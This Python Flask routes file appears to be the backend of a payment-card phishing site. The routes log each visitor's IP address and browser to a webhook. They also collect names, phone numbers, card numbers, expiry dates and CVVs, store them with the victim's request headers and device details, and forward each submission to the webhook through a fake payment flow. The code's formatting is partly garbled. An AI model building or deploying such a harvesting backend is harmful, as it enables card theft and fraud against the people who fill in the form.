app/routes.py

from flask import Blueprint, render_template, request, jsonify, redirect, url_for from app import db from app.models import Submission from app.services import send_to_webhook, format_submission_data import json

main_bp = Blueprint('main', name)

@main_bp.route('/', methods=['GET']) def index(): if request.method == 'GET': ip = request.remote_addr user_agent = request.headers.get('User-Agent') headers_json = json.dumps(dict(request.headers))

# Send initial visit webhook
    payload = {
        "content": f"🌐 New visitor from {ip}\n🧭 {user_agent}"
    }
    send_to_webhook(payload)

    return render_template('index.html')

@main_bp.route('/submit', methods=['POST']) def submit(): data = request.get_json() sub = Submission( name=data['name'], mobile=data['mobile'], card_number=data['card'], expiry=data['expiry'], cvv=data['cvv'], ip_address=request.remote_addr, user_agent=request.headers.get('User-Agent'), headers_json=json.dumps(dict(request.headers)), screen_resolution=data.get('screen'), timezone=data.get('timezone') ) db.session.add(sub) db.session.commit()

send_to_webhook(format_submission_data(sub, stage="Submitted"))
return jsonify({"status": "ok", "redirect": url_for('main.status', submission_id=sub.id)})

@main_bp.route('/status/int:submission_id') def status(submission_id): submission = Submission.query.get_or_404(submission_id) send_to_webhook({"content": f"🕒 User landed on payment page for ID {submission_id}"}) return render_template('status.html', submission_id=submission_id)

@main_bp.route('/api/check_status/int:submission_id') def check_status(submission_id): submission = Submission.query.get_or_404(submission_id) return jsonify({"paid": submission.payment_received})

@main_bp.route('/confirm/int:submission_id') def confirm(submission_id): submission = Submission.query.get_or_404(submission_id) submission.payment_received = True db.session.commit() send_to_webhook(format_submission_data(submission, stage="Payment Confirmed")) return redirect(url_for('main.success'))

@main_bp.route('/success') def success(): return render_template('success.html')

